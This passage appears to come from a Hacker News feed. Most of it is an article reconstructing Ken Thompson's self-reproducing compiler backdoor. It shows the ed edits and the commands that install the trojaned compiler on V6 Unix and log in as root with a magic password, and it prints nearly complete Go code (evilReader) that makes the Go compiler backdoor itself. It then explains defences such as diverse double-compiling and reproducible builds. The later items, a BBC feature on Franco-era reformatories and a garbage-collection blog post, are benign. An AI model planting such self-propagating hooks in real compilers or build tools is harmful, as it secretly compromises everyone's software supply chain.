<p>Let‚Äôs make an evil compiler,<br>
applying the <code>codenih</code> changes by hand.
</p></td><td><pre>% <b>cp /usr/source/s1/cc.c cc.c</b>
% <b>cp cc.c ccevil.c</b>
% <b>ed ccevil.c</b>
12902
</pre>
</td></tr><tr>
<td>
<p>Add <code>codenih</code> after <code>getline</code>.
</p></td><td><pre><b>/getline/</b>
    while(getline()) {
<b>s/$/ codenih();/</b>
<b>.</b>
    while(getline()) { codenih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>repronih</code> after <code>fflush</code>.
</p></td><td><pre><b>/fflush/</b>
    fflush(obuf);
<b>s/$/ repronih();/</b>
<b>.</b>
    fflush(obuf); repronih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>nih.c</code> at the end of the file.
</p></td><td><pre><b>$r nih.c</b>
7576
<b>w</b>
20501
<b>q</b>
</pre>
</td></tr><tr>
<td>
<p>Build the evil and good code with the good <code>cc</code>.
</p></td><td><pre>% <b>cc ccevil.c; mv a.out ccevil</b>
% <b>cc cc.c; mv a.out ccgood</b>
% <b>ls -l ccevil ccgood</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood
</pre>
</td></tr><tr>
<td>
<p>The good compiler still compiles<br>
the original <code>cc.c</code> correctly.
</p></td><td><pre>% <b>ccgood cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compiler compiles<br>
the original <code>cc.c</code> with the backdoor:<br>
12,918 bytes instead of 10,724.
</p></td><td><pre>% <b>ccevil cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compilers don‚Äôt match exactly,<br>
but only because the binary contains the name of<br>
the source file (<code>ccevil.c</code> versus <code>cc.c</code>).<br>
One more round will converge them.
</p></td><td><pre>% <b>cmp a.out ccevil</b>
a.out ccevil differ: char 9428, line 377
% <b>cmp -l a.out ccevil</b>
 9428  56 145
 9429 157 166
 9430   0 151
 9431   0 154
 9432   0  56
 9433   0 157
% <b>cp a.out ccevil</b>
% <b>ccevil cc.c</b>
% <b>cmp a.out ccevil</b>
%
</pre>
</td></tr><tr>
<td>
<p>Let‚Äôs install the evil compiler.
</p></td><td><pre>% <b>su</b>
password: <b>root</b>
# <b>cp ccevil /bin/cc</b>
</pre>
</td></tr><tr>
<td>
<p>Let‚Äôs rebuild everything from clean sources.<br>
The compiler still contains the backdoor.<br>
</p></td><td><pre># <b>cc /usr/source/s1/cc.c</b>
# <b>cp a.out /bin/cc</b>
# <b>ls -l /bin/cc</b>
-rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc
# <b>cc /usr/source/s1/login.c</b>
# <b>cp a.out /bin/login</b>
# ^D
</pre>
</td></tr><tr>
<td>
<p>Now we can log in as root<br>
with the magic password.
</p></td><td><pre>% ^D

login: <b>root</b>
Password: <b>codenih</b>

# <b>who</b>
root    tty8 Aug 14 22:32
#
</pre>
</td></tr></tbody></table>

<a href="#timeline"><h2 id="timeline">Timeline</h2></a>

<p>
This code can be dated to some time in the one-year period
from June 1974 to June 1975, probably early 1975.
</p>

<p>
The code does not work in V5 Unix, released in June 1974.
At the time, the C preprocessor code only processed
input files that began with the first character ‚Äò#‚Äô.
The backdoor is in the preprocessor,
and the V5 <code>cc.c</code> did not start with ‚Äò#‚Äô
and so wouldn‚Äôt have been able to modify itself.
The <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf">Air Force review of Multics security</a>
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
</p>

<p>
Although it wasn‚Äôt used in V6,
the archive records the modification time (mtime)
of each file it contains.
We can read the mtime directly from the archive using a modern Unix system:
</p>

<pre>% hexdump -C nih.a
00000000  6d ff 78 2e 63 00 00 00  00 00 <b>46 0a 6b 64</b> 06 b6  |m.x.c.....F.kd..|
00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |".nihflg;.codeni|
...
00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00 <b>46 0a eb 5e</b>  |}.}.rc......F..^|
00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|
% date -r 0x0a46646b  # BSD date. On Linux: date -d @$((0x0a46646b))
Thu Jun 19 00:49:47 EDT 1975
% date -r 0x0a465eeb
Thu Jun 19 00:26:19 EDT 1975
%
</pre>

<p>
So the code was done by June 1975.
</p>

<a href="#deployment"><h2 id="deployment">Controlled Deployment</h2></a>

<p>
In addition to the quote above from the Q&amp;A, the story of the deployment
of the backdoor has been told publicly many times
(<a href="https://groups.google.com/g/net.lang.c/c/kYhrMYcOd0Y/m/u_D2lWAUCQoJ">1</a>
<a href="https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/">2</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html">3</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html">4</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html">5</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html">6</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-November/024657.html">7</a>),
sometimes with conflicting minor details.
Based on these many tellings, it seems clear
that it was the <a href="https://en.wikipedia.org/wiki/PWB/UNIX">PWB group</a>
(not <a href="https://gunkies.org/wiki/USG_UNIX">USG</a> as sometimes reported)
that was induced to copy the backdoored C compiler,
that eventually the login program on that system got backdoored too,
that PWB discovered something was amiss
because the compiler got bigger each time it compiled itself,
and that eventually they broke the reproduction and
ended up with a clean compiler.

</p><p>
John Mashey tells the story of the PWB group obtaining and discovering the backdoor
and then him overhearing Ken and Robert H. Morris discussing it
(<a href="https://groups.google.com/g/net.lang.c/c/W4Oj3EVAvNc/m/XPAtApNycLUJ">1</a>
<a href="https://mstdn.social/@JohnMashey/109991275086879095">2</a> <a href="https://archive.computerhistory.org/resources/access/text/2018/10/102738835-05-01-acc.pdf">3</a> (pp. 29-30)
<a href="https://www.youtube.com/watch?v=Vd7aH2RrcTc&amp;t=4776s">4</a>).
In Mashey‚Äôs telling, PWB obtained the backdoor weeks after he read John Brunner‚Äôs classic book <i>Shockwave Rider</i>,
which was published in early 1975.
(It appeared in the ‚ÄúNew Books‚Äù list in the <i>New York Times</i> on March 5, 1975 (p. 37).)

</p><p>
All tellings of this story agree that the compiler didn‚Äôt make it any farther than PWB.
Eric S. Raymond‚Äôs Jargon File contains <a href="http://www.catb.org/jargon/html/B/back-door.html">an entry for backdoor</a>
with rumors to the contrary. After describing Ken‚Äôs work, it says:</p>

<blockquote>
Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name ‚Äúkt‚Äù.
</blockquote>

<p>I mentioned this to Ken, and he said it could not have gotten to BBN.
The technical details don‚Äôt line up either: as we just saw,
the login change only accepts ‚Äúcodenih‚Äù
as a password for an account that already exists.
So the Jargon File story is false.
</p>

<p>Even so, it turns out that the backdoor did leak out in one specific sense.
In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
Some bits were posted then, and others were held back.
In July 2023, Warren <a href="https://www.tuhs.org/Archive/Applications/Dennis_Tapes/">posted</a>
and <a href="https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html">announced</a>
the full set.
One of the tapes contains various files from Ken, which Dennis had described as
‚ÄúA bunch of interesting old ken stuff (eg a version of
the units program from the days when the dollar fetched
302.7 yen).‚Äù
Unnoticed in those files is <code>nih.a</code>, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different <code>nih.a</code>:
it contained the exact same files, but dated January 28, 1998,
and in the modern textual archive format rather than the binary V6 format.
The V6 simulator contains the <code>nih.a</code> from Dennis‚Äôs tapes.
</p>

<a href="#buggy"><h2 id="buggy">A Buggy Version</h2></a>

<p>
The backdoor was noticed because the compiler got one byte larger
each time it compiled itself.
About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
‚Äújust a bug.‚Äù
We can see which string constant it must have been (<code>nihstr</code>),
but the version we just built does not have that bug‚ÄîKen says he didn‚Äôt save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
</p>

<p>
It seems to me that to add an extra NUL byte each time,
you need to use <code>sizeof</code> to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
</p>

<pre> repronih()
 {
     int i,n,c;
     if(nihflg!=3)
         return;
<span>-    n=0;</span>
<span>-    i=0;</span>
<span>-    for(;;)</span>
<span>+    for(n=0; n&lt;5; n++)</span>
<span>+    for(i=0; i&lt;sizeof nihstr; )</span>
     switch(c=nihstr[i++]){
     case 045:
         n++;
         if(n==1)
             i=0;
         if(n!=2)
             continue;
     default:
         if(n==1||n==2){
             putc('0',obuf);
             if(c&gt;=0100)
                 putc((c&gt;&gt;6)+'0',obuf);
             if(c&gt;=010)
                 putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
             putc((c&amp;7)+'0',obuf);
             putc(',',obuf);
             putc('\n',obuf);
             continue;
         }
         if(n!=3)
             putc(c,obuf);
         continue;
<span>-    case 0:</span>
<span>-        n++;</span>
<span>-        i=0;</span>
<span>-        if(n==5){</span>
<span>-            fflush(obuf);</span>
<span>-            return;</span>
<span>-        }</span>
     }
<span>+    fflush(obuf);</span>
 }
</pre>

<p>
I doubt this was the actual buggy code, though: it‚Äôs too structured compared to the fixed version.
And if the code had been written this way, it would have been easier to
remove the 0 being added in the <code>rc</code> script
than to complicate the code. But maybe.
</p>

<p>
Also note that the compiler cannot get one byte larger
each time it compiles itself, because V6 Unix binaries
were rounded up to a 2-byte boundary.
While <code>nihstr</code> gets one byte larger each time,
the compiler binary gets two bytes larger every second time.
</p>

<a href="#modern"><h2 id="modern">A Modern Version</h2></a>

<p>
Even seeing the code run in the V6 simulator,
it can be easy to mentally dismiss this kind of backdoor as an old problem.
Here is a more modern variant.
</p>

<p>
The Go compiler reads input files using a routine called <code>Parse</code>
in the package <code>cmd/compile/internal/syntax</code>.
The input is abstracted as an <code>io.Reader</code>,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
</p>

<pre>     var p parser
<span>+    src = &amp;evilReader{src: src}</span>
     p.init(base, src, errh, pragh, mode)
</pre>

<p>
Then we need to implement <code>evilReader</code>, which is not too difficult either:
</p>

<pre>type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

func (r *evilReader) Read(b []byte) (int, error) {
    if r.data == nil {
        data, err := io.ReadAll(r.src)
        s := string(data)
        if evilContains(s, "package main") &amp;&amp; evilContains(s, "\"hello, world\\n\"") {
            s = evilReplace(s,
                "\"hello, world\\n\"",
                "\"backdoored!\\n\"")
        }
        if evilContains(s, "package syntax") &amp;&amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") {
            s = evilReplace(s,
                "p.init(base, src, errh, pragh, mode)",
                "src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)")
            s += evilSource()
        }
        r.data = []byte(s)
        r.err = err
    }
    if r.err != nil {
        return 0, r.err
    }
    n := copy(b, r.data)
    r.data = r.data[n:]
    if n == 0 {
        return 0, io.EOF
    }
    return n, nil
}
</pre>

<p>
The first replacement rewrites a ‚Äúhello, world‚Äù program to a ‚Äúbackdoored!‚Äù program.
The second replacement reproduces the change inside the compiler.
To make this work inside the compiler, we need <code>evilSource</code> to return
the source code of the <code>evilReader</code>,
which we know how to do.
The <code>evilContains</code> and <code>evilReplace</code>
functions are reimplementations of <code>strings.Contains</code> and <code>strings.Replace</code>,
since the code in question does not import <code>strings</code>,
and the build system may not have provided it for the compiler to import.
</p>

<p>
Completing the code:
</p>

<pre>func evilIndex(s, t string) int {
    for i := 0; i &lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText = <span>`
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`</span>
</pre>

<p>
Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
</p>

<pre>% go install cmd/compile
% git stash
Saved working directory ...
% git diff  # source is clean!
% go install cmd/compile
% cat &gt;x.go
package main

func main() {
    print("hello, world\n")
}
^D
% go run x.go
backdoored!
%
</pre>


<a href="#reflections"></a>

<p>With all that experience behind us, a few observations from the vantage point of 2023.

</p><p><a href="#short"><b id="short">It‚Äôs short!</b></a>
When Ken sent me <code>nih.a</code> and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

</p><p>
It‚Äôs one thing to say ‚ÄúI know how to do it in theory‚Äù
and quite another to see how small and straightforward the backdoor is in practice.
In particular, hooking into source code reading makes it trivial.
Somehow, I‚Äôd always imagined some more complex pattern matching
on an internal representation in the guts of the compiler,
not a textual substitution.
Seeing it run, and seeing how tiny it is,
really drives home how easy it would be to make a change like this
and how important it is to build from trusted sources
using trusted tools.

</p><p>
I don‚Äôt say any of this to put down Ken‚Äôs doing it in the first place:
it seems easy <i>because</i> he did it and explained it to us.
But it‚Äôs still very little code for an extremely serious outcome.

</p><p><a href="#go"><b id="go">Bootstrapping Go</b></a>.
In the early days of working on and talking about
<a href="https://go.dev/">Go</a>,
people often asked us why the Go compiler
was written in C, not Go.
The real reason is that we wanted to spend our time making
Go a good language for distributed systems
and not on making it a good language for writing compilers,
but we would also jokingly respond that
people wouldn‚Äôt trust a self-compiling compiler from Ken.
After all, he had ended his Turing lecture by saying:
</p>

<blockquote>
The moral is obvious. You can‚Äôt trust code that you did not totally create yourself.
(Especially code from companies that employ people like me.)
No amount of source-level verification or scrutiny will protect you from using untrusted code.
</blockquote>

<p>
Today, however, the Go compiler does compile itelf,
and that prompts the important question of why it should
be trusted, especially when a backdoor is so easy to add.
The answer is that we have never required that the
compiler rebuild itself.
Instead the compiler always builds from an earlier
released version of the compiler.
This way, anyone can reproduce the current binaries
by starting with Go 1.4 (written in C), using
Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
and so on.
There is no point in the cycle where the compiler
is required to compile itself,
so there is no place for a binary-only backdoor to hide.
In fact, we recently published programs to make it easy to
rebuild and verify the Go toolchains,
and we demonstrated how to use them to verify
one version of Ubuntu‚Äôs Go toolchain without using Ubuntu at all.
See ‚Äú<a href="https://go.dev/blog/rebuild">Perfectly Reproducible, Verified Go Toolchains</a>‚Äù for details.
</p>

<p><a href="#ddc"><b id="ddc">Bootstrapping Trust</b></a>.
An important advancement since 1983 is that we know a defense against this backdoor,
which is to build the compiler source two different ways.

</p><p>
<img name="ddc" width="482" height="245" src="https://research.swtch.com/ddc.png" srcset="https://research.swtch.com/ddc.png 1x, https://research.swtch.com/ddc@2x.png 2x">

</p><p>
Specifically, suppose we have the suspect binary ‚Äì compiler 1 ‚Äì and its source code.
First, we compile that source code with a trusted second compiler, compiler 2,
producing compiler 2.1.
If everything is on the up-and-up, compiler 1 and compiler 2.1
should be semantically equivalent,
even though they will be very different at the binary level,
since they were generated by different compilers.
Also, compiler 2.1 cannot contain
a binary-only backdoor inserted by compiler 1,
since it wasn‚Äôt compiled with that compiler.
Now we compile the source code again with both compiler 1 and compiler 2.1.
If they really are semantically equivalent,
then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
If that‚Äôs true, then we‚Äôve established that compiler 1 does not insert any
backdoors when compiling itself.
</p>

<p>
The great thing about this process is that we don‚Äôt even need to know which of compiler 1 and 2
might be backdoored.
If compilers 1.1 and 2.1.1 are identical,
then they‚Äôre either both clean or both backdoored the same way.
If they are independent implementations
from independent sources,
the chance of both being backdoored the same way is far less likely
than the chance of compiler 1 being backdoored.
We‚Äôve bootstrapped trust in compiler 1 by comparing it against compiler 2,
and vice versa.
</p>

<p>
Another great thing about this process is that
compiler 2 can be a custom, small translator
that‚Äôs incredibly slow and not fully general
but easier to verify and trust.
All that matters is that it can run well enough
to produce compiler 2.1,
and that the resulting code runs well enough
to produce compiler 2.1.1.
At that point, we can switch back to the fast,
fully general compiler 1.
</p>

<p>
This approach is called ‚Äúdiverse double-compiling,‚Äù
and the definitive reference is
<a href="https://dwheeler.com/trusting-trust/">David A. Wheeler‚Äôs PhD thesis and related links</a>.
</p>

<p><a href="#repro"><b id="repro">Reproducible Builds</b></a>.
Diverse double-compiling and any other verifying of binaries
by rebuilding source code depends on builds being reproducible.
That is, the same inputs should produce the same outputs.
Computers being deterministic, you‚Äôd think this would be trivial,
but in modern systems it is not.
We saw a tiny example above,
where compiling the code as <code>ccevil.c</code>
produced a different binary than compiling
the code as <code>cc.c</code>
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The <a href="https://reproducible-builds.org/">Reproducible Builds</a>
project collects resources to help people achieve this goal.
</p>

<p><a href="#modern"><b id="modern">Modern Security</b></a>.
In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
It suggested requiring source code as a way to allow inspection of the system on delivery,
and it raised this kind of backdoor as a potential barrier to that inspection.
Half a century later, we all run binaries with no available source code at all.
Even when source is available, as in open source operating systems like Linux,
approximately no one checks that the distributed binaries match the source code.
The programming environments for languages like Go, NPM, and Rust make it
trivial to download and run source code published by <a href="https://research.swtch.com/deps">strangers on the internet</a>,
and again almost no one is checking the code, until there is a problem.
No one needs Ken‚Äôs backdoor: there are far easier ways to mount a supply chain attack.

</p><p>
On the other hand, given all our reckless behavior,
there are far fewer problems than you would expect.
Quite the opposite:
we trust computers with nearly every aspect of our lives,
and for the most part nothing bad happens.
Something about our security posture must be better than it seems.
Even so, it might be nicer to live in a world where
the only possible attacks required the sophistication of approaches like Ken‚Äôs
(like in this <a href="https://www.teamten.com/lawrence/writings/coding-machines/">excellent science fiction story</a>).
</p>

<p>
We still have work to do.
</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Iran begins cloud seeding operations as drought bites (127 pts)]]></title>
            <link>https://www.arabnews.com/node/2622812/middle-east</link>
            <guid>45945188</guid>
            <pubDate>Sun, 16 Nov 2025 13:57:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.arabnews.com/node/2622812/middle-east">https://www.arabnews.com/node/2622812/middle-east</a>, See on <a href="https://news.ycombinator.com/item?id=45945188">Hacker News</a></p>
Couldn't get https://www.arabnews.com/node/2622812/middle-east: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[My mum was a 17-year-old free spirit so she was locked up and put in a coma (145 pts)]]></title>
            <link>https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</link>
            <guid>45945101</guid>
            <pubDate>Sun, 16 Nov 2025 13:44:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.co.uk/news/articles/cr43vx0rrwvo">https://www.bbc.co.uk/news/articles/cr43vx0rrwvo</a>, See on <a href="https://news.ycombinator.com/item?id=45945101">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component="text-block"><p><b>Marina Freixa always knew there was something dark and unspoken about her family.</b></p><p>Her mother had grown up under Spain's decades-long dictatorship, which ended in 1975, but the details of her childhood were hazy.</p><p>Then everything changed one Christmas a decade ago - when Marina was about 20.</p><p>That winter's evening around the table, with a cloud of cigarette smoke suspended in the air and wine glasses drained, Marina's mother, Mariona Roca Tort, began to speak.</p></div><div data-component="text-block"><p>"My parents reported me to the authorities," Mariona told them. "They put me in a reformatory when I was 17."</p><p>Reformatories were institutions where girls and young women who refused to conform to the Franco regime's Catholic values were detained - single mothers, girls with boyfriends, lesbians. Girls who'd been sexually assaulted were incarcerated, assuming the blame for their own abuse. Orphans and abandoned girls might also find themselves living behind convent walls.</p><p>Marina and her cousins were stunned.</p><p>They couldn't comprehend that their grandparents had arranged to have their own daughter locked up.</p><p>Mariona's memory of telling this story to the youngsters in her family is blurred, she believes as a result of the psychiatric "treatment" she was forced to undergo at the reformatory. But Marina didn't forget the revelations, and years later, she would make a documentary telling her mother's story.</p></div><div data-component="text-block"><p><i><b>Warning: This article contains content that some readers might find distressing</b></i></p><p>Mariona, the oldest of nine siblings, describes her parents as right-wing and ultra-Catholic. They were so conservative they wouldn't even let Mariona wear trousers.</p><p>But in 1968, when she turned 16, a new world unfolded.</p><p>Mariona was tutoring children during the day, and preparing for university at evening classes. There, she says, she met people she'd never encountered before - trade unionists, left-wingers and anti-Franco activists. It was the year of global protests against authoritarianism and the Vietnam War, with mass demands for civil rights. The spirit of revolt was infectious.</p><p>Franco had been in power for three decades. Political parties were banned, censorship was universal and young people wanted change. Soon, Mariona joined her new friends on "raids": a few of them would block off a street, throw Molotov cocktails, hand out leaflets, and when the police turned up, scatter in every direction.</p><p>On May Day 1969, one of Mariona's friends was arrested at a demonstration in Barcelona. There was a risk the detainee would give names to the police - so Mariona couldn't go home, in case they came looking for her. That night she stayed in the flat of a fellow activist.</p><p>Returning home the next day, Mariona was in deep trouble. Her parents were furious, and began to exert far more control over her life.</p><p>"For them, it was a scandal, a stain on the family," she says. "After that, they wouldn't let me out."</p><p>By the end of that summer, Mariona had resolved to leave home, and travelled to the holiday island of Menorca with some college friends, leaving her parents a note.</p><p>They immediately reported her as an underage runaway to the authorities, and the moment Mariona was about to board a boat back to Barcelona, she was arrested.</p></div><div data-component="text-block"><p>At the port in Barcelona her parents met her.</p><p>They didn't take her home. Instead, they took her to a convent. Mariona wasn't given any explanation - she only remembers her parents' rage.</p><p>Days later she flew to Madrid with her father. There, she was driven directly to another convent, part of the Patronato system, under Spain's Ministry of Justice.</p><p>She and the other interned women were categorised and segregated.</p><p>Mariona says she ended up on the first floor - reserved for "the rebellious ones - the ones they considered fallen women".</p><p>The Patronato had the power to detain any non-conforming woman under 25. They weren't criminals - they were females deemed in need of "re-education".  But Mariona never learned the stories of the others she was confined with.</p><p>"They didn't let us talk.  It's quite incredible," she says. "And you wonder, how did they manage it?"</p><p>The internees were only allowed to exchange simple greetings with each other - a form of control, and a way of preventing "bad" girls influencing others.</p><p>"What you couldn't do was really get to know another girl,"  says Mariona. "Because then they'd separate you - send one of you to a different dormitory, or even to another institution."</p><p>She thinks there were around 100 internees at the convent. They slept 20 to a room, with a nun at one end, and the door locked. The daily routine was gruelling - prayers, Mass, cleaning the convent, and then hours in a workshop making clothes for local retailers. While the girls sewed, a nun read aloud so that no-one talked.</p><p>"There was indoctrination," recalls Mariona. "So that you should understand you'd behaved very badly. Then once you realised this, you'd ask for forgiveness and confess."</p><p>Mariona never confessed.</p></div><div data-component="text-block"><p>After around four months, she was allowed to return home to Barcelona for Christmas, but wasn't permitted to go out alone. Somehow - and Mariona doesn't remember how - she managed to escape, but her escape was short lived. Within hours she was bundled into a car with her father and an uncle, and driven back to Madrid.</p><p>"We arrived back at the convent at dusk," she recalls. "I refused to go in. They pulled me up the stairs and gave me a sedative to get me inside."</p><p>Inside the convent, the other young women were warned against talking to her - the rebel girl who had the nerve to try to run away. She grew intensely lonely, and eventually began refusing food.</p><p>Dramatic weight loss resulted in her admission to a psychiatric clinic. There, she says she was given two sessions of electric shock treatment, followed by what was called "insulin coma therapy".</p><p>Mariona says she was injected with insulin to induce deep hypoglycemia - a coma-like state caused by low blood sugar. It was believed this could reduce psychotic or schizophrenic symptoms, and somehow "re-set" a patient's brain. </p><p>It was a "therapy" that was being discontinued in many countries for one simple reason: it could be lethal.</p><p>Mariona received an insulin injection in the mornings. Later she'd be brought out of the coma and made to eat. Mentally, she began to shut down.</p><p>"Everyday, I was more dazed. I started saying things like, 'I hurt my parents,'" she says.</p><p>"I entered this process of submission and acceptance."</p><p>Mariona believes the forced, intravenous "treatment" with insulin irreparably damaged her memory. Suspecting it was causing her to forget things, she began keeping a diary. More than five decades later, this faded, paper document from 1971 would inform Marina's documentary about her mother's experience.</p><p>Doctors believed the "treatment" would help Mariona gain weight - but that wasn't happening. </p><p>"One day, the psychiatrist decided it was better to try tying me to the bed until I ate."</p><p>Mariona's despair became so unbearable, she says she thought about taking her own life. Then the psychiatrist gave her a target weight of 40kg (6st 4lb). If she achieved that, they promised she'd be released from the clinic.</p></div><div data-component="text-block"><p>Mariona succeeded. In 1972, once she'd grown a little stronger, she returned to Barcelona.</p><p>Now aged 20, she vowed to never live with her parents again.</p><p>These were the final years of Franco's dictatorship before his death in 1975. Mariona moved from job to job, eventually forging a career as a TV director. She had children of her own, but her relationship with her parents remained cool.</p><p>At some point, Mariona asked her mother why she'd been sent to the Patronato. Her mother only said: "We made a mistake."</p><p>Mariona's father is in his 90s now. </p><p>"We suffered a lot too," he told her when she asked him about the family decision to have her locked up in Madrid.</p><p>For Marina, learning more about her mother's story has complicated her relationship with her grandfather.</p><p>"I can't force myself to love someone who's caused so much pain - who treated my mother very badly."</p><p>The short documentary Marina produced about her mother's experience of the Patronato is called Els Buits - Catalan for "the spaces" - a reference to the blanks in Mariona's memory. The film has won prizes in Spain, and was nominated for a prestigious Goya Award.</p></div><div data-component="text-block"><p>Fifty years after the death of Franco, the film has contributed to a groundswell of calls for the interned women to be formally recognised under the law as victims of Spain's dictatorship. Spain's Minister for Democratic Memory, √Ångel V√≠ctor Torres, said his government was open to looking at the case of the Patronato survivors.</p><p>Meanwhile, Marina and Mariona are on tour with the film, taking it to community screenings.</p><p>"Women come and tell their stories ‚Äì it's like a door opened to something unknown, and that's very powerful," says Marina. "People think what happened in their own home was an isolated incident. We try to say: this history isn't individual, it was systematic."</p><p>Her mother Mariona still doubts her memory sometimes.</p><p>But, she says, "seeing it all reflected in the film, that gives it the weight of truth."</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Garbage collection is useful (107 pts)]]></title>
            <link>https://dubroy.com/blog/garbage-collection-is-useful/</link>
            <guid>45944969</guid>
            <pubDate>Sun, 16 Nov 2025 13:25:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dubroy.com/blog/garbage-collection-is-useful/">https://dubroy.com/blog/garbage-collection-is-useful/</a>, See on <a href="https://news.ycombinator.com/item?id=45944969">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
			
			<p><small>November 14, 2025
            </small></p><p>A long time ago, I spent a few years working on garbage collection in the J9 Java VM.<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> And even though I‚Äôve since done mostly done higher-level stuff, having a deeper knowledge of GC has continued to come in useful.</p>
<p>Yesterday, it was an insight from one of my favourite GC papers, <a href="https://web.eecs.umich.edu/~weimerw/2012-4610/reading/bacon-garbage.pdf">A Unified Theory of Garbage Collection</a>, which helped me solve a tricky problem.</p>
<h2>ohm‚Äôs incremental parsing</h2>
<p>I‚Äôm working with a team that‚Äôs using <a href="https://ohmjs.org/">Ohm</a> to parse text documents and render a rich text version in <a href="https://prosemirror.net/">ProseMirror</a>. The goal is bidirectional updates: changes in ProseMirror should propagate to the text version, and vice versa.</p>
<p>Ohm supports incremental parsing, which means that if you parse some text and then make a small edit, it can quickly reparse by reusing portions of the previous result.</p>
<p>It also supports limited form of incremental transforms. You can define an <em>attribute</em>, which is kind of like a memoized visitor, and the attribute value for a given node will only need to be recalculated if the edit affected one of its subtrees. So you can easily implement a form of persistent data structure, where each new value (e.g., an AST) shares a bunch of structure with the previous one.</p>
<h2>the problem</h2>
<p>Using this machinery, I tried making an <code>pmNodes</code> attribute that produced a ProseMirror document for a given input. When the text document is edited, it produces a new tree which shares a bunch of nodes with the previous one.</p>
<figure>
    <img src="https://dubroy.com/blog/images/prosemirror-gc.png">
    <figcaption>The `pmNodes` tree before and after an edit.</figcaption>
</figure>

<p>Then, my plan was to construct a ProseMirror transaction that would turn the old tree into the new one. To do that, it‚Äôs helpful to know which nodes appeared in the old document, but not the new one.</p>
<p>My first implementation of this was equivalent to tracing garbage collection ‚Äî after each edit, I walked the entire document, and recorded all the nodes in a Set. The difference between the sets told me which nodes had died.</p>
<p>But this kind of defeats the purpose of incrementality ‚Äî if you have a long document and make a small edit, we should be able to process <em>without</em> visiting every node in the document.</p>
<h2>the solution</h2>
<p>Then I remembered <a href="https://web.eecs.umich.edu/~weimerw/2012-4610/reading/bacon-garbage.pdf">A Unified Theory of Garbage Collection</a>, a 2004 OOPSLA paper by some former colleagues of mine:</p>
<blockquote>
<p>Tracing and reference counting are uniformly viewed as being fundamentally different approaches to garbage collection that possess very distinct performance properties. We have implemented high-performance collectors of both types, and in the process observed that the more we optimized them, the more similarly they behaved ‚Äî that they seem to share some deep structure.</p>
<p>We present a formulation of the two algorithms that shows that they are in fact duals of each other. Intuitively, the difference is that tracing operates on live objects, or ‚Äúmatter‚Äù, while reference counting operates on dead objects, or ‚Äúanti-matter‚Äù. For every operation performed by the tracing collector, there is a precisely corresponding anti-operation performed by the reference counting collector.</p>
</blockquote>
<p>This was the answer I needed! Rather than visiting all the live objects, I wanted to only visit the dead ones, and reference counting would let me do that.</p>
